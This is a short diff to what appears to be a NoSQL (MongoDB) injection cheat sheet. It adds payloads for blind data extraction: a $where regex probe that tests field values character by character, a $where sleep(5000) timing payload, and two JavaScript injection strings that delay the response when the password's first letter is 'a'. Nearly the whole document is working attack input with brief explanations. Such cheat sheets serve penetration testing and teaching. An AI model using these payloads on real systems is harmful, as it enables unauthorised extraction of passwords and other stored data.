@@ -89,6 +89,10 @@ admin' && this.username!='
 ```
 - If there is operator support, then you can extract name of data fields with `keys()`. Extracts the first data field and returns the first character of the field name
 ```
+"$where":"this.email.match('^.{0}a.*')"
+```
+- After you get a working key, test it against characters one by one
+```
 {"$regex":"^.*"}
 ```
 - See if there is a regex match for a field
@@ -96,3 +100,15 @@ admin' && this.username!='
 {"$regex":"^a.*"}
 ```
 - See if there is a regex match for the field starts with 'a'
+```
+{"$where": "sleep(5000)"}
+```
+- Sleeps for 5s
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+```
+- Waits 5s if password starts with letter `a`
+```
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
+- Waits 5s if password starts with letter `a`
